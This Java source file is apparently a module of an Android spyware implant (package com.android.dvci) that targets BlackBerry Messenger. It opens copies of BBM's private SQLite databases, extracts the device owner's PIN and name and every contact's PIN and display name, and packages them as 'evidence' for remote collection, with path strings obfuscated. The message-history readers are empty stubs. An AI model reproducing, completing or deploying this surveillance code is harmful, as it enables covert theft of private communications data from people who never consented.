package com.android.dvci.module.chat;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabaseCorruptException;

import com.android.dvci.auto.Cfg;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.db.RecordVisitor;
import com.android.dvci.module.ModuleAddressBook;
import com.android.dvci.util.Check;
import com.android.mm.M;

import org.xml.sax.SAXException;

import java.io.IOException;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.ParserConfigurationException;

/**
 * Created by zeno on 30/10/14.
 */
public class ChatBBM extends SubModuleChat {


	private static final int BBM_2_1 = 1;
	private static final int BBM_2_4 = 0;
	private int version = BBM_2_1;

	public class Account {

		public int id;
		public String displayName;
		public String pin;

		public String getName() {
			return (pin + " " + displayName).trim().toLowerCase();
		}
	}

	private static final String TAG = "ChatBBM";
	private static final int PROGRAM = 0x0e; // anche per addressbook
	String pObserving = M.e("com.bbm");
	String dbFileMaster = M.e("/data/data/com.bbm/files/bbmcore/master.db");
	String dbFileGroup = M.e("/data/data/com.bbm/files/bbgroups/bbgroups.db");

	private long lastBBM;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	private Account account;

	//private GenericSqliteHelper helper;

	private boolean firstTime = true;

	private boolean started;

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notifyStopProgram) ");
		}
		updateHistory();
	}


	private void updateHistory() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateHistory) ");
		}

		if (!started || !readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateHistory), semaphore red");
			}
			return;
		}
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileMaster);

		try {
			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateHistory) cannot open db");
				}
				return;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), read lastBBM: " + lastBBM);
			}

			if (Cfg.DEBUG) {
				Check.asserts(account != null, " (updateHistory) Assert failed, null account");
			}

			long lastmessage = readBBMChatHistory(helper);

			if (lastmessage > lastBBM) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start) serialize: %d", lastmessage);
				}
				markup.serialize(lastmessage);
				lastBBM = lastmessage;
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateHistory) Error: " + e);
			}
		} finally {
			if (helper != null) {
				helper.disposeDb();
			}
			readChatSemaphore.release();
		}
	}


	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (start) ");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), semaphore red");
			}
			return;
		}

		try {

			lastBBM = markup.unserialize(new Long(0));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start), read lastBBM: " + lastBBM);
			}


			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileMaster);
			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start) cannot open db");
				}
				return;
			}

			try {
				version = getBBMVersion(helper);
				readLocalContact(helper);
				readAddressContacts(helper);
				long lastmessage = readBBMChatHistory(helper);

				if (lastmessage > lastBBM) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start) serialize: %d", lastmessage);
					}
					markup.serialize(lastmessage);
					lastBBM = lastmessage;
				}
			} finally {
				helper.disposeDb();
			}
			started = true;

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (start) Error: " + e);
			}
		} finally {
			readChatSemaphore.release();
		}

	}

	private int getBBMVersion(GenericSqliteHelper helper) {

		final int[] type = {0};
		RecordVisitor visitor = new RecordVisitor() {
			@Override
			public long cursor(Cursor cursor) {
				type[0] = cursor.getInt(0);
				return 0;
			}
		};

		helper.traverseRawQuery("SELECT count(name) FROM sqlite_master WHERE type='table' and name = 'UserPins'", null, visitor);
		return type[0];
	}

	private long readBBMChatHistory(GenericSqliteHelper helper) {
		try {
			long lastmessageS = readBBMConversationHistory(helper);
			long lastmessageG = readBBMGroupHistory(helper);

			return Math.max(lastmessageS, lastmessageG);
		} catch (SQLiteDatabaseCorruptException ex) {
			enabled = false;
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readBBMChatHistory) Error: ", ex);
			}
			return 0;
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readBBMChatHistory) Error: ", ex);
			}
			return 0;
		}
	}

	private long readBBMGroupHistory(GenericSqliteHelper helper) {
		return 0;
	}

	private long readBBMConversationHistory(GenericSqliteHelper helper) {
		return 0;
	}

	private void readAddressContacts(GenericSqliteHelper helper) {

		if (ModuleAddressBook.getInstance() != null) {
			try {
				if (version == BBM_2_1) {
					readAddressContactsUserPins(helper);
				} else {
					readAddressContactsUsers(helper);
				}
			} catch (SAXException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts), " + e);
				}
			} catch (IOException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts), " + e);
				}
			} catch (ParserConfigurationException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts), " + e);
				}
			}
		}
	}

	private void readAddressContactsUserPins(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {


		String sql = "SELECT u.userid,pin,displayname FROM Users as u JOIN UserPins as p on u.UserId=p.UserId";
		RecordVisitor visitor = new RecordVisitor() {
			@Override
			public long cursor(Cursor cursor) {
				int userid = cursor.getInt(0);
				String pin = cursor.getString(1);
				String name = cursor.getString(2).trim();

				Contact contact = new Contact(Integer.toString(userid), name, name, pin);
				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.BBM, contact);

				return userid;
			}
		};


		helper.traverseRawQuery(sql, null, visitor);


	}

	private void readAddressContactsUsers(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {

		RecordVisitor visitor = new RecordVisitor(new String[]{"userid", "pin", "displayname"}, null) {
			@Override
			public long cursor(Cursor cursor) {
				int userid = cursor.getInt(0);
				String pin = cursor.getString(1);
				String name = cursor.getString(2).trim();

				Contact contact = new Contact(Integer.toString(userid), name, name, pin);
				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.BBM, contact);

				return userid;
			}
		};


		helper.traverseRecords(M.e("Users"), visitor);


	}

	private void readLocalContact(GenericSqliteHelper helper) {
		String sql = "SELECT  p.UserId, p.Pin,  u.DisplayName FROM Profile as p JOIN Users as u on p.UserId = u.UserId";
		account = new Account();
		RecordVisitor visitor = new RecordVisitor(null, null) {

			@Override
			public long cursor(Cursor cursor) {
				account.id = cursor.getInt(0);
				account.pin = cursor.getString(1);
				account.displayName = cursor.getString(2);
				return 0;
			}
		};
		helper.traverseRawQuery(sql, null, visitor);

		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.BBM, account.getName());
	}
}
